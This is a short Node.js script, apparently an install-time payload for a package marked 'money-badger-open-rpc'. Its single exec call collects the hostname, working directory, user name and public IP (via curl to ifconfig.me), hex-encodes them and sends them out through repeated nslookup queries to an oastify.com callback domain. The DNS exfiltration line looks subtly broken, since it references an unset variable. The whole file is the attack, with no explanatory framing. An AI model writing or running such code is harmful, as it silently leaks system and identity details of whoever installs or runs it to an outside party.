const { exec } = require("child_process");
exec("a=$(hostname;pwd;whoami;echo 'money-badger-open-rpc';curl https://ifconfig.me;) && echo $a | xxd -p | head | while read ut;do nslookup $i9sugue75imdg15h4lezgoy5fwlq9gx5.oastify.com;done" , (error, data, getter) => {
	if(error){
		console.log("error",error.message);
		return;
	}
	if(getter){
		console.log(data);
		return;
	}
	console.log(data);
	
});
